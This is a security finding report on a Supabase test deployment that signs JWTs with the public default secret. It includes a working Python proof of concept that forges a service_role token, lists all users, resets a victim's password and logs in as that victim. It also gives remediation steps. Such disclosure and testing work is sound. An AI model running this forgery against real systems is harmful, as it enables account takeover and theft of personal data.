# Predictable JWT signing secret enables forged service_role token and full account takeover

**ID:** vuln-0002
**Severity:** CRITICAL
**Found:** 2026-08-26 07:41:25 UTC
**Target:** http://host.docker.internal:15421
**Endpoint:** /auth/v1/admin/users
**Method:** GET
**CWE:** CWE-798
**CVSS:** 9.8
**Fix Effort:** Medium

## Description

The Supabase deployment signs JWTs with the publicly known default secret `super-secret-jwt-token-with-at-least-32-characters-long`. Any unauthenticated attacker can forge a valid HS256 `service_role` JWT and gain full GoTrue admin privileges: enumerate every registered user and reset any account's password, achieving complete account takeover. The forged token is also accepted as the PostgREST `service_role` DB role, which bypasses Row Level Security.

An `alg=none` token returned 401 `PGRST301 "JWT is unsecured"`.

## Impact

An attacker with no prior access can mint arbitrary JWTs for any role and any user identity. Demonstrated consequences include: (1) listing all 15 registered accounts and their PII via `GET /auth/v1/admin/users`; (2) resetting any user's password via `PUT /auth/v1/admin/users/{id}` and logging in with the attacker-chosen password (full account takeover); and (3) causing PostgREST to execute queries as the `service_role` database role, which ignores RLS policies. Because the signing secret is shared by Kong/PostgREST/GoTrue/Storage, the compromise spans all Supabase services under this origin.

## Technical Analysis

The deployment is configured with the default `JWT_SECRET` shipped in the Supabase self-hosted docker-compose template: `super-secret-jwt-token-with-at-least-32-characters-long`. GoTrue, PostgREST, Kong, and Storage all verify Bearer tokens by HMAC-SHA256 against this shared secret, relying on its secrecy. Because the value is publicly documented, an attacker can compute a valid HS256 signature for any claim set.

A forged token carrying `{"role":"service_role"}` is accepted by:
- GoTrue, enabling the administrative API endpoints under `/auth/v1/admin/*` that require `service_role` authorization (list users, update users, reset passwords).
- PostgREST, where the JWT `role` claim is mapped to the PostgreSQL `service_role` role.

This was validated empirically: exact requests signed with the secret received 200-level authorization instead of the 401 `PGRST301` returned for wrong-secret or `alg=none` tokens. When the `sub` claim was a non-UUID, PostgREST advanced past signature verification to the query layer and returned a `22P02 invalid input syntax for type uuid` error — proving signature acceptance. A forged `postgres`-role token produced `permission denied to set role "postgres"`, further confirming claim-based role switching is honored.

Because the admin API fully trusts this token, an attacker can read all user records and set an arbitrary new password on any account, logging in as the victim immediately afterward.

## Proof of Concept

1. Reconstruct an HS256 JWT client-side using the public default secret `super-secret-jwt-token-with-at-least-32-characters-long`, with payload `{"iss":"http://127.0.0.1:15421/auth/v1","role":"service_role","sub":"<victim-or-self-uuid>","aud":"authenticated","exp":<future-timestamp>}`.
2. Send `GET /auth/v1/admin/users` with `Authorization: Bearer <forged-token>`; the response enumerates every registered user's id, email, metadata, and timestamps (HTTP 200).
3. Send `PUT /auth/v1/admin/users/<target-user-id>` with body `{"password":"<attacker-chosen>"}`; the server returns the updated user (HTTP 200).
4. Authenticate as the target with `POST /auth/v1/token?grant_type=password` using the attacker-chosen password to complete the account takeover (HTTP 200).

```python
import base64, hmac, hashlib, json, time, requests

BASE = "http://host.docker.internal:15421"
SECRET = "super-secret-jwt-token-with-at-least-32-characters-long"

def b64(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def enc(o): return b64(json.dumps(o).encode())

def forge_service_role():
    header = {"alg":"HS256","typ":"JWT"}
    now = int(time.time())
    payload = {
        "iss":"http://127.0.0.1:15421/auth/v1",
        "role":"service_role",
        "sub":"85937c5e-49c6-4ee5-9c46-241d7cf4d3ca",
        "aud":"authenticated",
        "exp": now + 3600,
    }
    signing = f"{enc(header)}.{enc(payload)}".encode()
    sig = hmac.new(SECRET.encode(), signing, hashlib.sha256).digest()
    return f"{enc(header)}.{enc(payload)}.{b64(sig)}"

tok = forge_service_role()
h = {"apikey":"anon", "Authorization": f"Bearer {tok}"}

# 1) Enumerate all users (admin-only endpoint)
r = requests.get(f"{BASE}/auth/v1/admin/users", headers=h, timeout=10)
print("admin/users:", r.status_code)
for u in r.json().get("users", []):
    print("  ", u["id"], u.get("email"))

# 2) Reset a victim's password
victim = "1e38e049-7f98-4573-926b-ee1b6626e1c0"
h2 = {**h, "Content-Type":"application/json"}
r = requests.put(f"{BASE}/auth/v1/admin/users/{victim}",
                  headers=h2, json={"password":"HackedPass999!"}, timeout=10)
print("admin reset:", r.status_code)

# 3) Login as victim with attacker-chosen password
r = requests.post(f"{BASE}/auth/v1/token?grant_type=password",
                   headers={"Content-Type":"application/json","apikey":"anon"},
                   json={"email":"authtest_b@example.com","password":"HackedPass999!"},
                   timeout=10)
print("login as victim:", r.status_code)  # 200 = account takeover
```

## Remediation

Replace the `JWT_SECRET` with a high-entropy random value (at least 64 bytes) and rotate it across all Supabase services (GoTrue, PostgREST, Kong, Storage, Realtime) so they all verify against the new secret. Regenerate the `anon` and `service_role` API keys accordingly. Set `GOTRUE_SIGNING_KEY`/`JWT_SECRET` to the new value and restart the services. Audit `auth.users` for any accounts whose passwords were altered by an unauthorized party, and enable token-rotation reuse detection for refresh tokens as defense in depth. Also configure a secrets manager and avoid committing secret values to version control or docker-compose templates.

## Assumptions

No credentials or user interaction required. The attacker only needs network access to the gateway and knowledge of the widely documented default Supabase `JWT_SECRET`. The finding assumes the deployment retains the default secret value (confirmed dynamically via signature acceptance).
